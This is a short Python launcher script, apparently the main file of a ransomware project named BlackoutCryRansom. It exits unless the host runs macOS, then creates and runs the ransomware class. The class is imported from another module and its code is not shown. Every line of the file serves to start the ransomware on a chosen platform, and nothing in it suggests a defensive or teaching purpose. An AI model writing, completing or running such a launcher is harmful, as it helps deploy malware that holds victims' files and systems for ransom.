from blackout_cry_ransom import BlackoutCryRansom
from utils import get_os

if __name__ == "__main__":
    operating_system = get_os()
    if operating_system != "macOS":
        exit(0)

    randsom = BlackoutCryRansom()
    randsom.run()